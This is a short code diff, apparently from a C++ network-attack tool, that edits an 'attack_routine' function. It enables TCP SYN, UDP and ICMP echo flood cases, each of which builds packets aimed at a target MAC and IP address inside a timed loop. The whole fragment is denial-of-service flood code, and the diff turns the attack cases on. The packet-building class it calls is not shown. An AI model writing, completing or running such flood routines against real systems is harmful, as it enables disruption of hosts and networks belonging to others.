@@ -43,7 +43,7 @@ void ATTACKMODULE::attack_routine(){
     struct timeval start, end, current;
     gettimeofday(&start, 0);
     end.tv_sec = start.tv_sec + dur;
-    
+
     while(1){
         gettimeofday(&current, 0);
         if(current.tv_sec - end.tv_sec >= 0) break;
@@ -74,20 +74,21 @@ void ATTACKMODULE::attack_routine(){
             case 5:
 
                 break;
+            */
 
             // TCP_TSNAMI_ATTACK
             case 6:
-
+                packet.make_packet(target_mac, target_ip, TCP, SYN, 1000);
                 break;
-            */
+
             // UDP_ATTACK
             case 7:
-                //packet.make_packet(tip, UDP, ?);
+                packet.make_packet(target_mac, target_ip, UDP, 0, 1000);
                 break;
 
             // ICMP_ATTACK
             case 8:
-                //packet.make_packet(tip, ICMP, ?);
+                packet.make_packet(target_mac, target_ip, ICMP, ICMP_ECHO, 0);
                 break;
 
             
